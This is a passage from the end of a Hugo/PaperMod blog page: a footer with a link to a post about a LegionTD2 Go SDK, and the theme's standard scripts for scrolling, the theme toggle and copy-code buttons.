<a class=next href=https://sy1.sh/posts/legiontd2-sdk/><span class=title>Next »</span><br><span>LegionTD2 Go SDK (v0.2.0)</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://sy1.sh>0x73796C31</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>